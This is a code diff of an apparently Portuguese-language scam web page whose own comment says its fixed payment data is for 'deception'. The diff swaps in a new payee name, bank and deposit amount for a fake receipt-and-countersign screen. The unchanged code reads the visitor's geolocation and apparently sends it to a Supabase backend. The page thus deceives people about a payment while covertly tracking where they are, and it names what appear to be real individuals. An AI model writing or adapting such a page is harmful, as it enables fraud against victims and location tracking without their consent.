@@ -27,12 +27,12 @@
         const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
         // Dados para validação (e enganação)
-        const NOME_FIXO = "Renato Tadeu Pereira";
-        const BANCO = "SICOOB";
-        const VALOR = "1.000,00"
+        const NOME_FIXO = "Diones José Pereira";
+        const BANCO = "Banco do Brasil";
+        const VALOR = "1.344,00"
         const CHAVE_PASSE = "754A38CF202548PP";
         const CONTRASENHA = "422JA54P2025BF82";
-        document.getElementById("dados").innerText = "Nome: " + NOME_FIXO + "\nBanco: " + BANCO + "\nValor: R$ " + VALOR;       
+        document.getElementById("dados").innerText = "Nome do recebedor: " + NOME_FIXO + "\nBanco: " + BANCO + "\nValor: R$ " + VALOR;       
 
         function checkAndSend() {
             const password = document.getElementById("password").value.trim();
@@ -72,7 +72,6 @@
             const longitude = position.coords.longitude;
             const localTime = new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });
             const isoTime = new Date(localTime).toISOString(); // Converte para formato ISO
-
             //document.getElementById("imagem").src = "assets/comprovante.png";
 
             try {
@@ -87,6 +86,7 @@
                 document.getElementById("status").innerText = "Contra-senha gerada com sucesso!";
                 document.getElementById("dados").innerText = "Informe este número ao depositante:\n" + CONTRASENHA;
                 console.log("Dados enviados:", data);
+
                 // Exibir botão de download após sucesso
                 document.getElementById("downloadBtn").style.display = "block";
                 document.getElementById("password").style.display = "none";
